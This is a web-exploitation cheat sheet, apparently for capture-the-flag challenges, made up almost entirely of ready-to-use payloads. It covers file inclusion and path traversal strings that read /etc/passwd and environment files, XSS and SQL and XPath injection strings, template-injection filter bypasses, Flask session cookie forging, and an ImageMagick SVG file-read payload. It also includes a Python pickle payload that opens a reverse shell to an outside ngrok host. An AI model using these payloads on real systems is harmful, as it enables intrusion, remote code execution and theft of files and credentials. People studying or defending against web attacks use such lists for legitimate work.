### Tricks 

- **Protocols**
  - `file:///etc/passwd`

- **Headers**
  - `X-Forwarded-Host`

### Local File Inclution
  - `/robots.txt`
  - `/.git`
  - `/sitemap.xml`
  - `?file=php://filter/convert.base64-encode/resource=/etc/passwd`
  - `?file='.system("cat /flag*").'`
  - `/../../../../../../proc/self/environ`
  - `/_nuxt/@fs/flag.txt`
  
### Path traversal
  - `%2e%2e/` -> `../`
  - `%2e%2e%2f` -> `../`
  - `..%2f` -> `../`

### XSS

  - **LFI** read file
```javascript
<script>
  x = new XMLHttpRequest;
  x.onload=function() {
    document.write(this.responseText)
  }; 
  x.open("GET", "file:///etc/passwd");
  x.send();
</script>;
````

### SQLi

- `UNION`

```
' UNION SELECT current_database() as name --
' AND 1=0 UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS --
```

### XPath Injection

```
'or string-length(name(.))=5 or '!'='
' or substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE) or '!'='
'or contains(.,'admin') or'
a' or (substring((//flag)[1], 1, 1)) = 'a
```

### Type juggling with data

- `Playing with header`

  - `curl -H "User-Agent: SUPER SECRET AGENT" http://victim.com/`
  - [code](https://github.com/ByamB4/CCC/blob/master/Web%20Exploitation/src/post-nullbyte.py)

### Server side template injection (SSTI)

- `Python`

  - Filtered `.`, `[]`
    - `obj.attribute` -> `obj|attr('attribute')` (`attr` is a filter in jinja template engine)
    - `obj[index]` -> `obj.__getitem__(index)` -> `obj|attr('__getitem__')(index)`
    - `obj['key']` -> `obj.__getitem__('key')` -> `obj|attr('__getitem__')('key')`

### JWT

- `Flask session cookie`
    - `flask-unsign --decode --cookie eyJsb2dnZWRfaW4iOmZhbHNlfQ.Yg9geQ.s8MKSRemMQyS5S60QTS0lY0Xg0o`
    - `flask-unsign --unsign --cookie < cookie.txt`
    - `flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password'`
    
- https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee


### Python pickle

- **RCE**
```python
import pickle, base64

class DillPickle:
  def __reduce__(self):
    import subprocess
    return (subprocess.check_output, (['/bin/cat', '/ls'],))

print(base64.b64encode(pickle.dumps(DillPickle())).decode())
```

- **Get shell**
```python
class RCE(object):
  def __reduce__(self):
    return (os.system,('''python2 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.jp.ngrok.io",13180));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' ''',))

p = base64.b64encode(pickle.dumps(RCE())).decode()
```

### Imagemagick

- File upload read local file (xxe)

  - Payload 
    ```
      <?xml version="1.0" encoding="UTF-8"?>
      <svg width="500px" height="500px">
        <image width="500" height="500" href="text:/etc/passwd" />
      </svg>
    ```

### Prototype pollution

- **Lodash**
  - `{"constructor": {"prototype": {"admin": True}}}`
  - `{"__proto__": {"name": "user", "password": "pass", "admin": True}}`
  
